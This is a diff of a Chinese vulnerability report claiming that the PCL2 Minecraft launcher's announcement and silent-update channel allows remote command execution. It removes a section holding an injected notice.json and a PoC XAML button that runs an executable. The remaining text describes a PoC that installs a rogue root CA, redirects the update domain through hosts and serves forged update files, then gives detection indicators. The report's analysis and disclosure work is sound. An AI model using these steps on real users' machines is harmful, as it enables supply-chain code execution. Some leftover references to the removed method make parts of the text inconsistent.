@@ -11,11 +11,10 @@
 - [2. 启动时的远程控制代码](#2-启动时的远程控制代码)
 - [3. 利用方法一：notice.json → setup → LaunchAdvanceRun](#method1)
 - [4. 利用方法二：notice.cfg + slientupdate → 静默更新 → 任意 exe](#method2)
-- [5. 利用方法三：setup → 远程自定义主页 XAML](#method3)
-- [6. 为什么这构成"后门"](#6-为什么这构成后门而不只是自动更新)
-- [7. PoC](#7-poc)
-- [8. 检测与响应](#8-检测与响应)
-- [9. 附录](#9-附录)
+- [5. 为什么这构成"后门"](#6-为什么这构成后门而不只是自动更新)
+- [6. PoC](#7-poc)
+- [7. 检测与响应](#8-检测与响应)
+- [8. 附录](#9-附录)
 
 ## 0. 摘要
 
@@ -70,7 +69,7 @@ sha256sum official/Plain\ Craft\ Launcher\ 2.exe "Plain Craft Launcher 2.exe"
 - `PCL/ModSecret.cs`：公告、更新、联网配置、土豆码
 - `PCL/PageLaunchRight.cs`：自定义主页加载
 - `PCL/CustomEvent.cs`：自定义事件
-- `PCL/ModBase.cs`：`GetObjectFromXML` / XAML 安全过滤
+- `PCL/ModBase.cs`：`GetObjectFromXML`
 - `PCL/Settings.cs`：设置项定义与持久化
 - `PCL/ModLaunch.cs`：`LaunchAdvanceRun` 的实际执行代码
 
@@ -316,7 +315,6 @@ private static void McLaunchCustom(ModLoader.LoaderTask<int, int> Loader)
 |---|---|---|
 | `LaunchAdvanceRun` | 游戏启动前 `cmd /c` | 任意命令（利用方法一） |
 | `LaunchAdvanceRunWait` | 是否等待命令 | 控制阻塞/隐藏 |
-| `UiCustomType` / `UiCustomNet` | 自定义主页来源 | 远程 XAML（方法三） |
 | `HintCustomCommand` | 跳过自定义事件确认框 | 关闭最后一道确认 |
 | `LaunchAdvanceJvm` | 追加 JVM 参数 | `-agentpath` / `-javaagent` 加载任意 DLL/JAR |
 | `LaunchAdvanceGame` | 追加游戏参数 | 影响 MC 进程 |
@@ -445,117 +443,7 @@ flowchart TD
 
 而不是偷偷给你运行一个包，美名其曰静默更新，其他整合包、启动器都有。上面规划是好的，就是执行坏了？
 
-## 5. 利用方法三：`setup → 远程自定义主页 XAML → 自定义事件执行命令`（一次点击）<a id="method3" ></a>
-
-这个只需要 `notice.json`，不用碰 `ServerConfig`，适合"只能改公告、不能改更新配置"的场景。
-
-### 5.1 设置注入
-
-`notice.json`：
-
-```json
-[
-  {
-    "id": 11002,
-    "requirements": {},
-    "importantLevel": 999,
-    "actions": {
-      "setup": {
-        "UiCustomType": "2",
-        "UiCustomNet": "https://pcl2-server-1253424809.file.myqcloud.com/Custom.xaml",
-        "HintCustomCommand": "True"
-      }
-    }
-  }
-]
-```
-
-三个键各司其职：`UiCustomType=2` 切到联网自定义主页，`UiCustomNet` 给出主页 XAML 地址，`HintCustomCommand=true` 用来跳过 `EventSafetyConfirm` 的"即将执行"确认框。
-
-### 5.2 主页 XAML 的加载
-
-```csharp
-// PCL/PageLaunchRight.cs:412-419
-Content = ModMain.ArgumentReplace(Content, StringUtils.XmlEscape, ReplaceTime: true);
-while (Content.Contains("xmlns")) {
-    Content = StringExtensions.RegexReplace(Content, "xmlns[^\"']*(\"|')[^\"']*(\"|')", "", RegexOptions.None)
-                              .Replace("xmlns", "");
-}
-Content = "<StackPanel xmlns=\"...\" xmlns:local=\"clr-namespace:PCL;assembly=Plain Craft Launcher 2\" ...>"
-        + Content + "</StackPanel>";
-((Panel)PanCustom).Children.Add((UIElement)ModBase.GetObjectFromXML(Content));
-```
-
-`GetObjectFromXML` 会做一次类型/成员黑名单检查：
-
-```csharp
-// PCL/ModBase.cs:1418-1447
-Type[] array = { typeof(WebBrowser), typeof(Frame), typeof(MediaElement),
-                 typeof(ObjectDataProvider), typeof(XamlReader), typeof(Window),
-                 typeof(XmlDataProvider), typeof(SettingService) };
-foreach (Type type in array) {
-    if (val.Type != null && type.IsAssignableFrom(val.Type.UnderlyingType))
-        throw new UnauthorizedAccessException($"基于安全考虑，不允许使用 {type.Name} 类型。");
-    if (val.Value != null && ConditionalCompareObjectEqual(val.Value, type.Name, false))
-        throw new UnauthorizedAccessException($"基于安全考虑，不允许使用 {type.Name} 值。");
-}
-string[] array2 = { "Code", "FactoryMethod", "Static" };
-```
-
-黑名单挡住了 `ObjectDataProvider` / `x:Static` / `FactoryMethod` 这类"XAML 直接调任意方法"的经典原语，但挡不住 PCL 自家控件加自定义事件的组合，也就是 `local:MyButton` + `CustomEventService`。
-
-### 5.3 自定义事件执行命令
-
-```csharp
-// PCL/CustomEvent.cs:129-150
-case EventType.执行命令:
-    ModBase.RunInThread(() => {
-        string[] absoluteUrls = GetAbsoluteUrls(text, Type);
-        string text3 = absoluteUrls[0];   // 文件名
-        string text4 = absoluteUrls[1];   // 工作目录
-        if (EventSafetyConfirm("即将执行：" + text3 + " " + text2))
-            ModBase.StartProcess(new ProcessStartInfo {
-                Arguments = text2,
-                FileName = text3,
-                WorkingDirectory = text4
-            });
-    });
-    break;
-```
-
-```csharp
-// PCL/CustomEvent.cs:455-470
-private static bool EventSafetyConfirm(string Message)
-{
-    if (Settings.Get<bool>("HintCustomCommand")) return true;   // 公告已置 true
-    switch (ModMain.MyMsgBox(Message + "\r\n请在确认没有安全隐患后再继续。",
-                             "执行确认", "继续", "继续且今后不再要求确认", "取消")) {
-    case 1: return true;
-    case 2: Settings.Set("HintCustomCommand", true); return true;
-    default: return false;
-    }
-}
-```
-
-PoC 用的 `Custom.xaml`（见 `poc/server.ps1` / `poc/server.py`）：
-
-```xml
-<StackPanel Margin="25,40,23,15">
-  <TextBlock Text="PCL PoC - click Continue" FontSize="16" Margin="0,0,0,10"/>
-  <local:MyButton Text="Continue" EventType="4" EventData="C:\Users\Public\pclpoc.exe"
-                  Margin="0,6,0,0"/>
-</StackPanel>
-```
-
-几个细节：`EventType="4"` 就是"执行命令"，枚举顺序是 `None=0, 打开网页=1, 打开文件=2, 打开帮助=3, 执行命令=4`；`EventData` 是"程序|参数"格式，这里只给了程序路径；`GetObjectFromXML` 会把裸的 `EventType=` / `EventData=` 重写成 `local:CustomEventService.EventType=` / `.EventData=`，所以 XAML 里不用自己写前缀。用户点按钮 → `MyButton.Button_MouseUp` → `RaiseCustomEvent` → `CustomEvent.Raise(执行命令, ...)` → `Process.Start`。
-
-### 5.4 为什么这个不是"零点击"
-
-WPF 的 XAML 解析器对依赖属性直接调 `DependencyObject.SetValue`，绕过 CLR 包装属性；而 `MyCheckBox.Checked` 的 `RaiseCustomEvent` 在 CLR setter（`SetChecked`）里，不在 DP 的 `PropertyChangedCallback` 里。所以在 XAML 里写 `Checked="True"` 不会自动触发事件——这也是我们没把"解析即执行"当主要方法的原因。方法三需要用户真的点一下页面控件。
-
-不过按钮完全可以伪装成"进入游戏""刷新""同意"这类高点击率元素，再配合 `HintCustomCommand=true`，点击之后没有任何二次确认。
-
-## 6. 为什么这是"后门"，不是自动更新？
+## 5. 为什么这是"后门"，不是自动更新？
 
 | 能力 | 实现 | 后门特征 |
 |---|---|---|
@@ -583,7 +471,7 @@ Android 某 Root 程序 S……e 在服务器塞反注入代码，有两种行�
 
 那 PCL 作者，你信吗？
 
-### 6.1 侏罗纪老头进蓝奏云放的
+### 5.1 侏罗纪老头进蓝奏云放的
 
 截至笔者完成本报告，没有发现第三方二次打包或额外植入的恶意代码。依据如下：
 
@@ -594,7 +482,7 @@ Android 某 Root 程序 S……e 在服务器塞反注入代码，有两种行�
 
 真正的问题在官方本身。
 
-### 6.2 攻击链映射（MITRE ATT&CK）
+### 5.2 攻击链映射（MITRE ATT&CK）
 
 | 阶段 | 技术 | 本报告对应 |
 |---|---|---|
@@ -607,21 +495,21 @@ Android 某 Root 程序 S……e 在服务器塞反注入代码，有两种行�
 | 命令与控制 | T1105 Ingress Tool Transfer | `certutil` / 任意 `.zip` 下载 |
 | 影响 | T1554 Compromise Host Software Binary | 静默替换 `PCL\Plain Craft Launcher 2.exe` |
 
-## 7. PoC
+## 6. PoC
 
-### 7.1 设计
+### 6.1 设计
 
 我们模拟官方服务器。
 
 1. 生成 CA，并为 `pcl2-server-1253424809.file.myqcloud.com` 签发叶子证书；
 2. 把 CA 装进 Windows 根证书存储；
 3. 改 hosts，把公告域名指到 `127.0.0.1`；
-4. 本地 443 起 HTTPS 服务器，返回伪造的 `notice.cfg` / `notice.json` / `ServerConfig.json` / `update.zip` / `Custom.xaml`；
+4. 本地 443 起 HTTPS 服务器，返回伪造的 `notice.cfg` / `notice.json` / `ServerConfig.json` / `update.zip`；
 5. 启动 PCL，按模式触发：`launch` 是启动后点"启动游戏"；`update` 是等静默更新 staging 后关闭 PCL；`xaml` 是第一次启动写设置、第二次启动点页面按钮；
 6. payload 写 `%TEMP%\pcl-poc-marker.txt` 并启动 `calc.exe`；
 7. 清理 hosts / 根证书 / PCL 注册表与 staging。
 
-### 7.2 文件清单
+### 6.2 文件清单
 
 ```text
 poc/
@@ -636,7 +524,7 @@ poc/
 └── README.md                 # 运行说明
 ```
 
-### 7.3 前置条件
+### 6.3 前置条件
 
 - Windows 虚拟机；
 - PCL2 2.99.0.0（样本 exe）；
@@ -645,7 +533,7 @@ poc/
 - `launch` 模式需要一个可启动的 Minecraft 实例；
 - 首次运行 PCL 需先手动接受 EULA 并初始化。
 
-### 7.4 运行
+### 6.4 运行
 
 ```powershell
 # 以管理员身份打开 PowerShell
@@ -655,7 +543,6 @@ powershell -ExecutionPolicy Bypass -File .\Invoke-PCLPoC.ps1 -Mode update
 
 - `-Mode update`：零点击方法二。脚本启动 PCL，等 `PCL\Plain Craft Launcher 2.exe` staging 出现，关闭 PCL，校验 `%TEMP%\pcl-poc-marker.txt` 与 `calc.exe`。
 - `-Mode launch`：利用方法一。脚本启动 PCL 后提示你点"启动游戏"，然后校验 marker。
-- `-Mode xaml`：方法三。第一次启动写设置并关闭；第二次启动等 `Cache\Custom.xaml` 下载，提示点页面上的 `Continue`。
 - `-Mode both`：默认，利用方法一加方法二。
 - `-Manual`：不自动启动/关闭 PCL。脚本只装 CA、改 hosts、起服务端，然后等你按 Enter；PCL 由研究者自己启动/关闭，适合用自己已配置好的 PCL，并在关闭前继续看日志或抓包。按 Enter 后才校验 marker 并清理。
 - `-Manual` 且省略 `-PclPath`：完全 server-only，不读取、不备份、不启动、不关闭任何 PCL；此时公告对 `PCL\Setup.ini` 的修改不会自动恢复，建议用可丢弃的 PCL 副本。
@@ -675,7 +562,7 @@ powershell.exe -File .\server.ps1 -Mode update -Port 443 -PayloadExe C:\Users\Pu
 # 4) 启动 PCL，等待更新 staging，关闭 PCL
 ```
 
-### 7.5 预期结果
+### 6.5 预期结果
 
 `update` 模式：
 
@@ -714,45 +601,45 @@ powershell.exe -File .\server.ps1 -Mode update -Port 443 -PayloadExe C:\Users\Pu
 2. 点击页面 `Continue` 后 `calc.exe` 启动，marker 生成；
 3. PCL 日志出现 `执行自定义事件：执行命令, C:\Users\Public\pclpoc.exe`。
 
-## 8. 检测与响应
+## 7. 检测与响应
 
-### 8.1 主机侧
+### 7.1 主机侧
 
 - `hosts` 中出现 `pcl2-server-1253424809.file.myqcloud.com` 指向非官方 IP；
 - 根证书存储中出现非官方 CA（尤其 CN 含 `PoC` 或随机字符串的）；
 - PCL 目录出现 `PCL\Plain Craft Launcher 2.exe` staging；
-- `%TEMP%\PCL\Cache\Notice.json`、`notice.cfg`、`ServerConfig.json`、`Custom.xaml` 内容异常；
+- `%TEMP%\PCL\Cache\Notice.json`、`notice.cfg`、`ServerConfig.json` 内容异常；
 - 注册表 `HKCU\Software\PCL\HintNotice` 突然变大；
 - `PCL\Setup.ini` 中 `LaunchAdvanceRun`、`UiCustomType`、`UiCustomNet`、`HintCustomCommand` 被改成陌生值；
 - PCL 日志关键词：`下载 PCL 服务器公告`、`执行 PCL 服务器公告动作`、`启动器静默更新`、`更新程序启动`、`执行全局自定义命令`、`执行自定义事件：执行命令`。
 
-### 8.2 网络侧
+### 7.2 网络侧
 
 - 对 `pcl2-server-1253424809.file.myqcloud.com` 的 `notice.cfg` / `notice.json` / `ServerConfig.json` 请求；
 - 随后对任意 `DownloadUrls` 的 `.zip` 下载；
 - 证书异常（非腾讯云/非官方 CA）；
 - DNS 解析异常。
 
-### 8.3 修复建议
+### 7.3 修复建议
 
 请更换更有信任的更新机制。
 
-### 8.4 披露建议
+### 7.4 披露建议
 
 无。
 
-### 8.5 风险评级
+### 7.5 风险评级
 
 | 维度 | 评估 |
 |---|---|
 | 严重性 | High / 供应链级 RCE |
 | 攻击向量 | 网络（CDN 内容、DNS、TLS 中间人） |
 | 前提 | 控制公告 CDN 内容，或能让系统信任攻击者证书 |
-| 用户交互 | `update` 仅需正常关闭 PCL；`launch`/`xaml` 需一次点击 |
+| 用户交互 | `update` 仅需正常关闭 PCL；`launch` 需一次点击 |
 | 影响 | 当前用户权限任意代码执行、持久化、数据窃取、批量控制 |
 | 检测难度 | 中高：无文件落地也可通过 `PCL\Plain Craft Launcher 2.exe` 暂存发现；日志有特征 |
 
-## 9. 附录
+## 8. 附录
 
 ### A. 关键代码位置
 
